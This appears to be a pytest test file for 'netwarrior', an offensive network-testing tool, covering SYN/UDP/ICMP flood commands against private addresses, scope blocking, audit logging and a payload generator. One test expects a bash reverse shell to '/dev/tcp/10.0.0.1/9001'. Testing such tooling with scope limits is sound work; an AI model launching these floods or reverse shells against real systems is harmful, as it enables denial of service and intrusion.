import asyncio

import netwarrior as nw


def make_ui(rig):
    ui = nw.UI(rig.config, rig.net, rig.registry, rig.log, rig.engine, rig.audit)
    return ui


async def run(ui, cmd):
    await ui._process_command(cmd)
    return ui.cmd_output


async def test_mode_switching(build_rig):
    ui = make_ui(build_rig())
    await run(ui, "1")
    assert ui.mode == "attack"
    await run(ui, "2")
    assert ui.mode == "recon"
    await run(ui, "menu")
    assert ui.mode == "menu"


async def test_attack_launches_without_blocking(build_rig):
    ui = make_ui(build_rig())
    loop = asyncio.get_running_loop()
    t0 = loop.time()
    out = await run(ui, "attack syn 10.0.0.9 80 5 500")
    assert loop.time() - t0 < 0.5
    assert "launched" in out
    await asyncio.sleep(0.2)
    assert ui.registry.active()
    ui._stop_attacks()


async def test_stop_does_not_kill_engine(build_rig):
    ui = make_ui(build_rig())
    await run(ui, "attack udp 10.0.0.9 53 5 400")
    await asyncio.sleep(0.2)
    await run(ui, "stop")
    await asyncio.sleep(0.1)
    assert not ui.registry.active()
    assert not ui.engine._stop.is_set()
    # engine still usable
    await run(ui, "attack icmp 10.0.0.9 0 3 300")
    await asyncio.sleep(0.2)
    assert ui.registry.active()
    ui._stop_attacks()


async def test_safe_mode_blocks_out_of_scope(build_rig):
    ui = make_ui(build_rig(scope=["10.0.0.0/8"]))
    out = await run(ui, "attack syn 8.8.8.8 80 5 100")
    assert "out of scope" in out
    assert not ui.registry.active()


async def test_bad_args_do_not_crash(build_rig):
    ui = make_ui(build_rig())
    for bad in ["attack", "attack syn", "attack bogus x", "scan", "sql http://x", "payload"]:
        out = await run(ui, bad)
        assert out and "Traceback" not in out


async def test_payload_and_report(build_rig):
    ui = make_ui(build_rig())
    assert "/dev/tcp/10.0.0.1/9001" in await run(ui, "payload revshell 10.0.0.1 9001 bash")
    assert "written to" in await run(ui, "report save")
    assert (ui.config.output_dir).exists()


async def test_attack_is_audited(build_rig):
    rig = build_rig()
    ui = make_ui(rig)
    await run(ui, "attack syn 10.0.0.9 80 3 300")
    await asyncio.sleep(0.1)
    ui._stop_attacks()
    lines = (rig.config.output_dir / "audit.log").read_text().splitlines()
    assert any('"action": "attack"' in ln and "10.0.0.9" in ln for ln in lines)
